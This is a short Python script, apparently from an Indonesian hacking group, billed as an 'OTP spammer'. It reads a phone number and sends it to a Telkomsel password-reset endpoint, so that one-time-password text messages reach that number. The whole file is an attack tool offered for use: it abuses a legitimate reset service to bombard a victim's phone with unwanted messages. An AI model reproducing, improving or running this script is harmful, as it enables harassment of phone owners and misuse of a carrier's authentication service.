# FB: fb.me/widhisec | IG : @widhisec | YT : zsecc0de-crew ID
# ga usah di recode capek w bikin
try:
	from requests import post
except Exception:
	   print ("modul requests belom di install")
class roli:
	  urlz = "https://roli.telkomsel.com/auth/forgot_password"
print ("""
< ROLI OTP SPAMMER >
< POWERED BY ZSECC0DE-CREW.ID
""")
o = input("nomor here :")
fuck = {'msisdn': o}
ajg = post(roli.urlz,fuck)
print ("STATUS:",ajg.json()["message"])